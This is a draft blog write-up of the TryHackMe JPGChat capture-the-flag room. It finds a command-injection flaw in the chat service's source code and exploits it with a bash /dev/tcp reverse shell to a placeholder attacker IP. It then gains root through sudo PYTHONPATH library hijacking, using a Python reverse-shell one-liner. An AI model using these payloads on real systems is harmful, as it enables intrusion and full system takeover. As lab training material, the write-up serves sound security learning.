---
layout: post
title: JPGChat CTF Writeup [DRAFT]
---

This is my first CTF Writeup, in this case for the [JPGChat room on TryHackMe](https://tryhackme.com/room/jpgchat).

## Enumeration
We first add an entry to */etc/hosts*:

```bash
echo "10.10.A.B jpgchat.thm >> /etc/hosts"
```

Nmap show only ports 22 and 3000 open.

> add nmap screenshot

To interact with port 3000 we tried telnet and received the following text:
```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```
> Mention the hint on tryhackme
So we use nc now to interact:

```bash
echo "[REPORT]" | nc jpgchat.thm 3000
```

And we have some more details:

```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
this report will be read by Mozzie-jpg
your name:
```

To found the repository, we went github.com and searched for users https://github.com/search?q=Mozzie-jpg&type=users

The repository is: https://github.com/Mozzie-jpg/JPChat

And looking through the code we discovered a line:

```python
os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
```

## User Flag

So what we need is to escape a bash command to get a reverse shell:

echo "[REPORT]\n username \n 0<&196;exec 196<>/dev/tcp/10.11.X.Y/4243; bash <&196 >&196 2>&196;" | nc jpgchat.thm 3000

> Mention about the semicolon


Remember to have have nc listening on the specific port in your attack machine:

```bash
nc -lvnp 4243
```

Now as **wes** user, we found the user.txt flag.

## Root flag:

```bash
sudo -l:
User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

So we can do library hijacking because we can use the SETENV to change the PYTHONPATH.

We check the python script first:
```bash
wes@ubuntu-xenial:~$ cat /opt/development/test_module.py
```
```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

So what we need is to create a compare.py file in a custom PYTHONPATH that will spawn a reverse shell:

```bash
cd /tmp

echo "import sys,socket,os,pty;s=socket.socket();s.connect(('10.11.X.Y',int('8042')));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')" > compare.py
```

Finally we can run this sudo command to get a root reverse shell:

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/development/test_module.py
```
